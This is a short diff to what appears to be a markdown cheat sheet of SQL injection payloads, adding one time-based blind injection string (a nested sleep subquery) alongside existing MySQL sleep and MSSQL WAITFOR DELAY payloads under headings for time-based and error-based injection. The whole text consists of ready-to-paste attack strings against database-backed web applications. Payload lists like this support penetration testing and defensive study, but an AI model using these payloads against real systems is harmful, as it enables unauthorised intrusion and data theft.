@@ -1,6 +1,7 @@
 ## Time Based Blind SQL Injection:
 ```
 '(select * from (select(sleep(10)))a)
+,(select*from(select(sleep(15)))a)
 ';WAITFOR DELAY '0:0:30'--
 ```
 ## Error Based SQL Injection:
